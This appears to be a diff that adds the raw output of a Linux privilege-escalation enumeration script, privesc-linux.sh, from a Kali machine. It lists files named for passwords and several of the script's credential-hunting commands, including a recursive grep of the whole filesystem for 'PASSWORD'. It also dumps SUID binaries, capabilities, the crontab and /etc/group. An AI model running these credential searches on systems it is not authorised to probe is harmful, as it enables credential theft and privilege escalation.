+./result.txt:/usr/lib/python3/dist-packages/django/contrib/auth/templates/auth/widgets/read_only_password_hash.html
+./result.txt:/usr/lib/python3/dist-packages/django/contrib/auth/templates/registration/password_reset_subject.txt
+./result.txt:/usr/lib/python3/dist-packages/django/forms/jinja2/django/forms/widgets/password.html
+./result.txt:/usr/lib/python3/dist-packages/django/forms/templates/django/forms/widgets/password.html
+./result.txt:/usr/lib/python3/dist-packages/faraday/server/commands/change_password.py
+./result.txt:/usr/lib/python3/dist-packages/faraday/server/commands/__pycache__/change_password.cpython-39.pyc
+./result.txt:/usr/lib/python3/dist-packages/flask_security/password_util.py
+./result.txt:/usr/lib/python3/dist-packages/flask_security/passwordless.py
+./result.txt:/usr/lib/python3/dist-packages/flask_security/__pycache__/password_util.cpython-39.pyc
+./result.txt:/usr/lib/python3/dist-packages/flask_security/__pycache__/passwordless.cpython-39.pyc
+./result.txt:/usr/lib/python3/dist-packages/flask_security/templates/security/change_password.html
+./result.txt:/usr/lib/python3/dist-packages/flask_security/templates/security/forgot_password.html
+./result.txt:/usr/lib/python3/dist-packages/flask_security/templates/security/reset_password.html
+./result.txt:/usr/lib/python3/dist-packages/jedi/third_party/django-stubs/django-stubs/contrib/auth/password_validation.pyi
+./result.txt:/usr/lib/python3/dist-packages/pypykatz/utils/crypto/gppassword.py
+./result.txt:/usr/lib/python3/dist-packages/pypykatz/utils/crypto/__pycache__/gppassword.cpython-39.pyc
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/password_hash.py
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/password_hash_fl2003.py
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/password_hash_fl2008.py
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/password_hash_gpgme.py
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/password_hash_ldap.py
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/password_quality.py
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/password_test.py
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/__pycache__/password_hash.cpython-39.pyc
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/__pycache__/password_hash_fl2003.cpython-39.pyc
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/__pycache__/password_hash_fl2008.cpython-39.pyc
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/__pycache__/password_hash_gpgme.cpython-39.pyc
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/__pycache__/password_hash_ldap.cpython-39.pyc
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/__pycache__/password_quality.cpython-39.pyc
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/__pycache__/password_test.cpython-39.pyc
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/samba_tool/passwordsettings.py
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/samba_tool/provision_password_check.py
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/samba_tool/user_check_password_script.py
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/samba_tool/__pycache__/passwordsettings.cpython-39.pyc
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/samba_tool/__pycache__/provision_password_check.cpython-39.pyc
+./result.txt:/usr/lib/python3/dist-packages/samba/tests/samba_tool/__pycache__/user_check_password_script.cpython-39.pyc
+./result.txt:/usr/lib/python3/dist-packages/wapitiCore/data/attacks/passwords.txt
+./result.txt:/usr/lib/systemd/systemd-reply-password
+./result.txt:/usr/lib/systemd/system/systemd-ask-password-console.path
+./result.txt:/usr/lib/systemd/system/systemd-ask-password-console.service
+./result.txt:/usr/lib/systemd/system/systemd-ask-password-plymouth.path
+./result.txt:/usr/lib/systemd/system/systemd-ask-password-plymouth.service
+./result.txt:/usr/lib/systemd/system/systemd-ask-password-wall.path
+./result.txt:/usr/lib/systemd/system/systemd-ask-password-wall.service
+./result.txt:/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
+./result.txt:/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
+./result.txt:/usr/lib/x86_64-linux-gnu/libmariadb3/plugin/caching_sha2_password.so
+./result.txt:/usr/lib/x86_64-linux-gnu/libmariadb3/plugin/mysql_clear_password.so
+./result.txt:/usr/lib/x86_64-linux-gnu/libmariadb3/plugin/sha256_password.so
+./result.txt:/usr/lib/x86_64-linux-gnu/samba/ldb/password_hash.so
+./result.txt:/usr/share/commix/src/txt/passwords_john.txt
+./result.txt:/usr/share/desktop-directories/05-password-attacks.directory
+./result.txt:/usr/share/doc/cryptsetup-nuke-password
+./result.txt:/usr/share/doc/cryptsetup-nuke-password/README.md
+./result.txt:/usr/share/doc/cryptsetup-nuke-password/changelog.gz
+./result.txt:/usr/share/doc/cryptsetup-nuke-password/copyright
+./result.txt:/usr/share/doc/metasploit-framework/modules/auxiliary/admin/http/mantisbt_password_reset.md
+./result.txt:/usr/share/doc/metasploit-framework/modules/auxiliary/admin/http/netgear_soap_password_extractor.md
+./result.txt:/usr/share/doc/metasploit-framework/modules/auxiliary/gather/c2s_dvr_password_disclosure.md
+./result.txt:/usr/share/doc/metasploit-framework/modules/auxiliary/gather/ipcamera_password_disclosure.md
+./result.txt:/usr/share/doc/metasploit-framework/modules/auxiliary/scanner/http/http_sickrage_password_leak.md
+./result.txt:/usr/share/doc/metasploit-framework/modules/exploit/osx/local/root_no_password.md
+./result.txt:/usr/share/doc/metasploit-framework/modules/post/firefox/gather/passwords.md
+./result.txt:/usr/share/doc/metasploit-framework/modules/post/osx/gather/password_prompt_spoof.md
+./result.txt:/usr/share/doc/metasploit-framework/modules/post/osx/gather/vnc_password_osx.md
+./result.txt:/usr/share/doc/metasploit-framework/modules/post/windows/gather/credentials/avira_password.md
+./result.txt:/usr/share/doc/metasploit-framework/modules/post/windows/gather/credentials/teamviewer_passwords.md
+./result.txt:/usr/share/doc/metasploit-framework/modules/post/windows/gather/credentials/xshell_xftp_password.md
+./result.txt:/usr/share/doc/p7zip/DOC/MANUAL/cmdline/switches/password.htm
+./result.txt:/usr/share/faraday/server/www/images/icon-login-password-lock.svg
+./result.txt:/usr/share/hashcat/rules/T0XlC-insert_top_100_passwords_1_G.rule
+./result.txt:/usr/share/help/C/onboard/password-dialogs.page
+./result.txt:/usr/share/help/C/zenity/password.page
+./result.txt:/usr/share/help/C/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/bg/zenity/password.page
+./result.txt:/usr/share/help/bg/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/ca/zenity/password.page
+./result.txt:/usr/share/help/ca/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/cs/zenity/password.page
+./result.txt:/usr/share/help/cs/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/da/zenity/password.page
+./result.txt:/usr/share/help/da/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/de/zenity/password.page
+./result.txt:/usr/share/help/de/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/el/zenity/password.page
+./result.txt:/usr/share/help/el/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/en_GB/zenity/password.page
+./result.txt:/usr/share/help/en_GB/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/es/zenity/password.page
+./result.txt:/usr/share/help/es/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/eu/zenity/password.page
+./result.txt:/usr/share/help/eu/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/fi/zenity/password.page
+./result.txt:/usr/share/help/fi/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/fr/zenity/password.page
+./result.txt:/usr/share/help/fr/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/gl/zenity/password.page
+./result.txt:/usr/share/help/gl/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/hu/zenity/password.page
+./result.txt:/usr/share/help/hu/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/ja/zenity/password.page
+./result.txt:/usr/share/help/ja/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/oc/zenity/password.page
+./result.txt:/usr/share/help/oc/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/pl/zenity/password.page
+./result.txt:/usr/share/help/pl/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/pt_BR/zenity/password.page
+./result.txt:/usr/share/help/pt_BR/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/ru/zenity/password.page
+./result.txt:/usr/share/help/ru/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/sl/zenity/password.page
+./result.txt:/usr/share/help/sl/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/sv/zenity/password.page
+./result.txt:/usr/share/help/sv/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/uk/zenity/password.page
+./result.txt:/usr/share/help/uk/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/help/zh_CN/zenity/password.page
+./result.txt:/usr/share/help/zh_CN/zenity/figures/zenity-password-screenshot.png
+./result.txt:/usr/share/icons/Adwaita/16x16/legacy/dialog-password.png
+./result.txt:/usr/share/icons/Adwaita/16x16/status/dialog-password-symbolic.symbolic.png
+./result.txt:/usr/share/icons/Adwaita/22x22/legacy/dialog-password.png
+./result.txt:/usr/share/icons/Adwaita/24x24/legacy/dialog-password.png
+./result.txt:/usr/share/icons/Adwaita/24x24/status/dialog-password-symbolic.symbolic.png
+./result.txt:/usr/share/icons/Adwaita/256x256/legacy/dialog-password.png
+./result.txt:/usr/share/icons/Adwaita/32x32/legacy/dialog-password.png
+./result.txt:/usr/share/icons/Adwaita/32x32/status/dialog-password-symbolic.symbolic.png
+./result.txt:/usr/share/icons/Adwaita/48x48/legacy/dialog-password.png
+./result.txt:/usr/share/icons/Adwaita/48x48/status/dialog-password-symbolic.symbolic.png
+./result.txt:/usr/share/icons/Adwaita/64x64/status/dialog-password-symbolic.symbolic.png
+./result.txt:/usr/share/icons/Adwaita/96x96/status/dialog-password-symbolic.symbolic.png
+./result.txt:/usr/share/icons/Adwaita/scalable/status/dialog-password-symbolic.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Dark/actions/scalable/dialog-password.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Dark/actions/scalable/password-copy.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Dark/actions/scalable/password-generator.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Dark/actions/scalable/preferences-desktop-user-password.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/1password.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/appimagekit-1password.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/dialog-password.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/gcr-password.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/kali-password-attacks-trans.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/password-manager.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/password.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/passwords.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/preferences-desktop-user-password.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Dark/apps/symbolic/password-manager-symbolic.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Dark/panel/1password-panel.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Dark/panel/dialog-password-panel.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Dark/status/symbolic/dialog-password-symbolic.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Light/actions/scalable/dialog-password.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Light/actions/scalable/password-copy.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Light/actions/scalable/password-generator.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Light/actions/scalable/preferences-desktop-user-password.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Light/panel/1password-panel.svg
+./result.txt:/usr/share/icons/Flat-Remix-Blue-Light/panel/dialog-password-panel.svg
+./result.txt:/usr/share/icons/Windows-10-Icons/16x16/status/dialog-password.png
+./result.txt:/usr/share/icons/Windows-10-Icons/22x22/status/dialog-password.png
+./result.txt:/usr/share/icons/Windows-10-Icons/24x24/status/dialog-password.png
+./result.txt:/usr/share/icons/Windows-10-Icons/256x256/status/dialog-password.png
+./result.txt:/usr/share/icons/Windows-10-Icons/32x32/status/dialog-password.png
+./result.txt:/usr/share/icons/Windows-10-Icons/48x48/status/dialog-password.png
+./result.txt:/usr/share/icons/Windows-10-Icons/scalable/status/dialog-password-symbolic.svg
+./result.txt:/usr/share/icons/hicolor/16x16/apps/gcr-password.png
+./result.txt:/usr/share/icons/hicolor/16x16/categories/kali-password-attacks-trans.png
+./result.txt:/usr/share/icons/hicolor/22x22/apps/gcr-password.png
+./result.txt:/usr/share/icons/hicolor/22x22/categories/kali-password-attacks-trans.png
+./result.txt:/usr/share/icons/hicolor/24x24/apps/gcr-password.png
+./result.txt:/usr/share/icons/hicolor/24x24/categories/kali-password-attacks-trans.png
+./result.txt:/usr/share/icons/hicolor/256x256/apps/gcr-password.png
+./result.txt:/usr/share/icons/hicolor/256x256/categories/kali-password-attacks-trans.png
+./result.txt:/usr/share/icons/hicolor/32x32/apps/gcr-password.png
+./result.txt:/usr/share/icons/hicolor/32x32/categories/kali-password-attacks-trans.png
+./result.txt:/usr/share/icons/hicolor/48x48/apps/gcr-password.png
+./result.txt:/usr/share/icons/hicolor/48x48/categories/kali-password-attacks-trans.png
+./result.txt:/usr/share/icons/hicolor/scalable/categories/kali-password-attacks-trans.svg
+./result.txt:/usr/share/initramfs-tools/hooks/cryptsetup-nuke-password
+./result.txt:/usr/share/john/1password2john.py
+./result.txt:/usr/share/john/password.lst
+./result.txt:/usr/share/john/__pycache__/1password2john.cpython-39.pyc
+./result.txt:/usr/share/john/rules/T0XlC-insert_top_100_passwords_1_G.rule
+./result.txt:/usr/share/legion/wordlists/ssh-password.txt
+./result.txt:/usr/share/man/man1/systemd-ask-password.1.gz
+./result.txt:/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz
+./result.txt:/usr/share/man/man3/zip_set_default_password.3.gz
+./result.txt:/usr/share/man/man8/systemd-ask-password-console.path.8.gz
+./result.txt:/usr/share/man/man8/systemd-ask-password-console.service.8.gz
+./result.txt:/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
+./result.txt:/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
+./result.txt:/usr/share/metasploit-framework/script-password
+./result.txt:/usr/share/metasploit-framework/data/wordlists/hci_oracle_passwords.csv
+./result.txt:/usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt
+./result.txt:/usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv
+./result.txt:/usr/share/metasploit-framework/data/wordlists/password.lst
+./result.txt:/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+./result.txt:/usr/share/metasploit-framework/data/wordlists/vnc_passwords.txt
+./result.txt:/usr/share/metasploit-framework/lib/metasploit/framework/password_crackers
+./result.txt:/usr/share/metasploit-framework/lib/metasploit/framework/password_crackers/cracker.rb
+./result.txt:/usr/share/metasploit-framework/lib/metasploit/framework/password_crackers/hashcat
+./result.txt:/usr/share/metasploit-framework/lib/metasploit/framework/password_crackers/invalid_wordlist.rb
+./result.txt:/usr/share/metasploit-framework/lib/metasploit/framework/password_crackers/jtr
+./result.txt:/usr/share/metasploit-framework/lib/metasploit/framework/password_crackers/wordlist.rb
+./result.txt:/usr/share/metasploit-framework/lib/metasploit/framework/password_crackers/hashcat/formatter.rb
+./result.txt:/usr/share/metasploit-framework/lib/metasploit/framework/password_crackers/jtr/formatter.rb
+./result.txt:/usr/share/metasploit-framework/lib/msf/core/auxiliary/password_cracker.rb
+./result.txt:/usr/share/metasploit-framework/lib/msf/core/web_services/authentication/strategies/user_password.rb
+./result.txt:/usr/share/metasploit-framework/modules/auxiliary/admin/2wire/xslt_password_reset.rb
+./result.txt:/usr/share/metasploit-framework/modules/auxiliary/admin/http/dlink_dir_645_password_extractor.rb
+./result.txt:/usr/share/metasploit-framework/modules/auxiliary/admin/http/dlink_dsl320b_password_extractor.rb
+./result.txt:/usr/share/metasploit-framework/modules/auxiliary/admin/http/mantisbt_password_reset.rb
+./result.txt:/usr/share/metasploit-framework/modules/auxiliary/admin/http/netgear_soap_password_extractor.rb
+./result.txt:/usr/share/metasploit-framework/modules/auxiliary/admin/http/zyxel_admin_password_extractor.rb
+./result.txt:/usr/share/metasploit-framework/modules/auxiliary/admin/scada/modicon_password_recovery.rb
+./result.txt:/usr/share/metasploit-framework/modules/auxiliary/admin/vxworks/apple_airport_extreme_password.rb
+./result.txt:/usr/share/metasploit-framework/modules/auxiliary/dos/http/wordpress_long_password_dos.rb
+./result.txt:/usr/share/metasploit-framework/modules/auxiliary/gather/c2s_dvr_password_disclosure.rb
+./result.txt:/usr/share/metasploit-framework/modules/auxiliary/gather/ipcamera_password_disclosure.rb
+./result.txt:/usr/share/metasploit-framework/modules/auxiliary/gather/netgear_password_disclosure.rb
+./result.txt:/usr/share/metasploit-framework/modules/auxiliary/scanner/http/http_sickrage_password_leak.rb
+./result.txt:/usr/share/metasploit-framework/modules/auxiliary/scanner/misc/raysharp_dvr_passwords.rb
+./result.txt:/usr/share/metasploit-framework/modules/auxiliary/scanner/misc/rosewill_rxs3211_passwords.rb
+./result.txt:/usr/share/metasploit-framework/modules/auxiliary/scanner/telnet/lantronix_telnet_password.rb
+./result.txt:/usr/share/metasploit-framework/modules/exploits/linux/antivirus/escan_password_exec.rb
+./result.txt:/usr/share/metasploit-framework/modules/exploits/osx/local/root_no_password.rb
+./result.txt:/usr/share/metasploit-framework/modules/exploits/osx/local/sudo_password_bypass.rb
+./result.txt:/usr/share/metasploit-framework/modules/exploits/windows/http/integard_password_bof.rb
+./result.txt:/usr/share/metasploit-framework/modules/post/firefox/gather/passwords.rb
+./result.txt:/usr/share/metasploit-framework/modules/post/osx/gather/autologin_password.rb
+./result.txt:/usr/share/metasploit-framework/modules/post/osx/gather/password_prompt_spoof.rb
+./result.txt:/usr/share/metasploit-framework/modules/post/osx/gather/vnc_password_osx.rb
+./result.txt:/usr/share/metasploit-framework/modules/post/windows/gather/credentials/avira_password.rb
+./result.txt:/usr/share/metasploit-framework/modules/post/windows/gather/credentials/teamviewer_passwords.rb
+./result.txt:/usr/share/metasploit-framework/modules/post/windows/gather/credentials/xshell_xftp_password.rb
+./result.txt:/usr/share/metasploit-framework/modules/post/windows/manage/change_password.rb
+./result.txt:/usr/share/metasploit-framework/tools/password
+./result.txt:/usr/share/metasploit-framework/tools/password/cpassword_decrypt.rb
+./result.txt:/usr/share/metasploit-framework/tools/password/halflm_second.rb
+./result.txt:/usr/share/metasploit-framework/tools/password/hmac_sha1_crack.rb
+./result.txt:/usr/share/metasploit-framework/tools/password/lm2ntcrack.rb
+./result.txt:/usr/share/metasploit-framework/tools/password/md5_lookup.rb
+./result.txt:/usr/share/metasploit-framework/tools/password/vxdigger.rb
+./result.txt:/usr/share/metasploit-framework/tools/password/vxencrypt.rb
+./result.txt:/usr/share/metasploit-framework/tools/password/vxmaster.rb
+./result.txt:/usr/share/metasploit-framework/tools/password/winscp_decrypt.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/actionview-6.1.4.1/lib/action_view/helpers/tags/password_field.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activemodel-6.1.4.1/lib/active_model/secure_password.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/bcrypt-3.1.16/lib/bcrypt/password.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/bcrypt-3.1.16/spec/bcrypt/password_spec.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/authentication/method/password
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/authentication/method/password.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/authentication/method/password/context.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/app/models/metasploit/credential/blank_password.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/app/models/metasploit/credential/password.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/app/models/metasploit/credential/password_hash.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/app/models/metasploit/credential/origin/cracked_password.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/db/migrate/20140605173747_create_metasploit_credential_origin_cracked_passwords.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/spec/factories/metasploit/credential/password_hashes.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/spec/factories/metasploit/credential/passwords.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/spec/models/metasploit/credential/password_hash_spec.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/spec/models/metasploit/credential/password_spec.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-credential-5.0.5/spec/models/metasploit/credential/origin/cracked_password_spec.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-model-4.0.3/app/validators/password_is_strong_validator.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit-model-4.0.3/spec/app/validators/password_is_strong_validator_spec.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/net-ldap-0.17.0/lib/net/ldap/password.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/net-ssh-6.1.0/lib/net/ssh/authentication/methods/password.rb
+./result.txt:/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/nexpose-7.3.0/lib/nexpose/password_policy.rb
+./result.txt:/usr/share/nmap/nselib/data/passwords.lst
+./result.txt:/usr/share/nmap/scripts/http-domino-enum-passwords.nse
+./result.txt:/usr/share/nmap/scripts/ms-sql-empty-password.nse
+./result.txt:/usr/share/nmap/scripts/mysql-empty-password.nse
+./result.txt:/usr/share/pam/common-password
+./result.txt:/usr/share/pam/common-password.md5sums
+./result.txt:/usr/share/plymouth/themes/futureprototype/password_dot.png
+./result.txt:/usr/share/plymouth/themes/futureprototype/password_dot16.png
+./result.txt:/usr/share/plymouth/themes/futureprototype/password_field.png
+./result.txt:/usr/share/plymouth/themes/futureprototype/password_field16.png
+./result.txt:/usr/share/plymouth/themes/homeworld/password_dot.png
+./result.txt:/usr/share/plymouth/themes/homeworld/password_dot16.png
+./result.txt:/usr/share/plymouth/themes/homeworld/password_field.png
+./result.txt:/usr/share/plymouth/themes/homeworld/password_field16.png
+./result.txt:/usr/share/plymouth/themes/joy/password_dot.png
+./result.txt:/usr/share/plymouth/themes/joy/password_dot16.png
+./result.txt:/usr/share/plymouth/themes/joy/password_field.png
+./result.txt:/usr/share/plymouth/themes/joy/password_field16.png
+./result.txt:/usr/share/plymouth/themes/kali/password-dot.png
+./result.txt:/usr/share/plymouth/themes/kali/password-field.png
+./result.txt:/usr/share/plymouth/themes/lines/password_dot.png
+./result.txt:/usr/share/plymouth/themes/lines/password_dot16.png
+./result.txt:/usr/share/plymouth/themes/lines/password_field.png
+./result.txt:/usr/share/plymouth/themes/lines/password_field16.png
+./result.txt:/usr/share/plymouth/themes/moonlight/password_dot.png
+./result.txt:/usr/share/plymouth/themes/moonlight/password_dot16.png
+./result.txt:/usr/share/plymouth/themes/moonlight/password_field.png
+./result.txt:/usr/share/plymouth/themes/moonlight/password_field16.png
+./result.txt:/usr/share/plymouth/themes/softwaves/password_dot.png
+./result.txt:/usr/share/plymouth/themes/softwaves/password_dot16.png
+./result.txt:/usr/share/plymouth/themes/softwaves/password_field.png
+./result.txt:/usr/share/plymouth/themes/softwaves/password_field16.png
+./result.txt:/usr/share/powershell-empire/empire/server/modules/powershell/credentials/get_lapspasswords.yaml
+./result.txt:/usr/share/powershell-empire/empire/server/modules/powershell/credentials/mimikatz/logonpasswords.yaml
+./result.txt:/usr/share/powershell-empire/empire/server/modules/python/privesc/windows/get_gpppasswords.yaml
+./result.txt:/usr/share/sqlmap/tamper/sp_password.py
+./result.txt:/usr/share/sqlmap/tamper/__pycache__/sp_password.cpython-39.pyc
+./result.txt:/usr/share/whatweb/plugins/java-password-log.rb
+./result.txt:/usr/share/whatweb/plugins/password_field.rb
+./result.txt:/usr/share/whatweb/plugins/quest-password-manager.rb
+./result.txt:/usr/share/windows-resources/mimikatz/kiwi_passwords.yar
+./result.txt:/var/cache/debconf/passwords.dat
+./result.txt:/var/lib/dpkg/info/cryptsetup-nuke-password.config
+./result.txt:/var/lib/dpkg/info/cryptsetup-nuke-password.list
+./result.txt:/var/lib/dpkg/info/cryptsetup-nuke-password.md5sums
+./result.txt:/var/lib/dpkg/info/cryptsetup-nuke-password.postinst
+./result.txt:/var/lib/dpkg/info/cryptsetup-nuke-password.postrm
+./result.txt:/var/lib/dpkg/info/cryptsetup-nuke-password.preinst
+./result.txt:/var/lib/dpkg/info/cryptsetup-nuke-password.templates
+./result.txt:/var/lib/pam/password
+./result.txt:[0;94mOthers passwords                                  #[0m
+./privesc-linux.sh:echo -e "${blue}Locate each file with string \"password\" for name #${reset}"
+./privesc-linux.sh:locate password
+./privesc-linux.sh:echo -e "${blue}Others passwords                                  #${reset}"
+./privesc-linux.sh:otherpassword=`find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;`
+./privesc-linux.sh:echo -e "${red}$otherpassword${reset}"
+./privesc-linux.sh:echo -e "${blue}Git password                                      #${reset}"
+./privesc-linux.sh:        echo "No Git password"
+./privesc-linux.sh:        echo -e "${red}Git passwords : $findgit2 ${reset}"
+./privesc-linux.sh:echo -e "${blue}Find each string \"password\"                      #${reset}"
+./privesc-linux.sh:echo -e "${blue}Output in password.txt                            #${reset}"
+./privesc-linux.sh:echo "Launch password research (yes/no)?"
+./privesc-linux.sh:	echo "Start password research ..."
+./privesc-linux.sh:	grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null > passwords.txt[0m
+
+[0;94m###################################################[0m
+[0;94mSUID                                              #[0m
+[0;94m###################################################[0m
+[0;91m   790083     16 -rwsr-sr-x   1 root     root        14616 Nov 27 06:03 /usr/lib/xorg/Xorg.wrap[0m
+
+[0;94m###################################################[0m
+[0;94mCapabilities                                      #[0m
+[0;94m###################################################[0m
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/fping cap_net_raw=ep
+/usr/bin/dumpcap cap_net_admin,cap_net_raw=eip
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+No tar capabilities
+No openssl capabilities
+No python capabilities
+No perl capabilities
+
+[0;94m###################################################[0m
+[0;94mCrontab find PATH                                 #[0m
+[0;94m###################################################[0m
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+No PATH in crontab
+
+[0;94m###################################################[0m
+[0;94m/etc/groups                                       #[0m
+[0;94m###################################################[0m
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:kali,root
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:kali,root
+fax:x:21:
+voice:x:22:
+cdrom:x:24:kali
+floppy:x:25:kali
+tape:x:26:
+sudo:x:27:kali
